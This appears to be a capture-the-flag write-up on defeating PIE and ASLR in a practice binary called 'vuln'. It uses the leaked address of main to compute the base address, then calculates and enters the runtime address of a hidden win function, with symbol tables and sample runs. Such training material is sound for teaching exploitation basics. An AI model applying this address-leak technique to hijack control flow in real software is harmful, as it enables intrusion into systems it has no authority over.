



We're analyzing a PIE (Position Independent Executable) binary named `vuln`. The objective is to hijack control flow and jump to a hidden `win` function located at offset `0x12a7`. A segmentation fault occurs when attempting to directly jump to `0x12a7`, due to ASLR and PIE randomizing memory addresses.

## Understanding the Issue

The binary prints the runtime address of `main`, for example:

```
Address of main: 0x55eeb2a1c33d
```

This indicates that the binary is loaded at a randomized base address. The address of `main` in the binary (from symbols) is at offset `0x133d`, and the `win` function is at offset `0x12a7`.

## Step-by-Step Exploitation

### 1. Identify Offsets (From Binary Symbols)

```
0x00000000000012a7  win
0x000000000000133d  main
```

### 2. Get Runtime Address of main

Run the binary:

```
$ ./vuln
Address of main: 0x55eeb2a1c33d
Enter the address to jump to, ex => 0x12345:
```

### 3. Calculate Base Address

Using the runtime address of `main` and its offset in the binary:

```
base_address = runtime_main_address - offset_main
base_address = 0x55eeb2a1c33d - 0x133d = 0x55eeb2a1b000
```

### 4. Calculate Actual Address of `win`

```
win_address = base_address + offset_win
win_address = 0x55eeb2a1b000 + 0x12a7 = 0x55eeb2a1c2a7
```

### 5. Input the Calculated Address

Enter the full calculated address when prompted:

```
0x55eeb2a1c2a7
```

### 6. Repeat on Each Run

Due to ASLR, base address will change every time. Always re-calculate `win` using the leaked `main` address.

### Example Run

```
$ ./vuln
Address of main: 0x56af8e51533d
Enter the address to jump to, ex => 0x12345:
```

Calculation:

```
main offset = 0x133d
base = 0x56af8e51533d - 0x133d = 0x56af8e514000
win offset = 0x12a7
win = 0x56af8e514000 + 0x12a7 = 0x56af8e5152a7
```

Input:

```
0x56af8e5152a7
```

## GDB Output (Symbols)

```
Non-debugging symbols:
0x0000000000001000  _init
0x00000000000010e0  __cxa_finalize@plt
0x00000000000010f0  putchar@plt
0x0000000000001100  puts@plt
0x0000000000001110  fclose@plt
0x0000000000001120  __stack_chk_fail@plt
0x0000000000001130  printf@plt
0x0000000000001140  fgetc@plt
0x0000000000001150  signal@plt
0x0000000000001160  setvbuf@plt
0x0000000000001170  fopen@plt
0x0000000000001180  __isoc99_scanf@plt
0x0000000000001190  exit@plt
0x00000000000011a0  _start
0x00000000000011d0  deregister_tm_clones
0x0000000000001200  register_tm_clones
0x0000000000001240  __do_global_dtors_aux
0x0000000000001280  frame_dummy
0x0000000000001289  segfault_handler
0x00000000000012a7  win
0x000000000000133d  main
0x0000000000001410  __libc_csu_init
0x0000000000001480  __libc_csu_fini
0x0000000000001488  _fini
(gdb) quit
```

## Conclusion

This challenge demonstrates basic PIE binary exploitation using address leakage. By understanding ASLR and symbol offsets, you can compute runtime addresses for exploitation. Always recalculate addresses on every new run due to memory layout randomization.
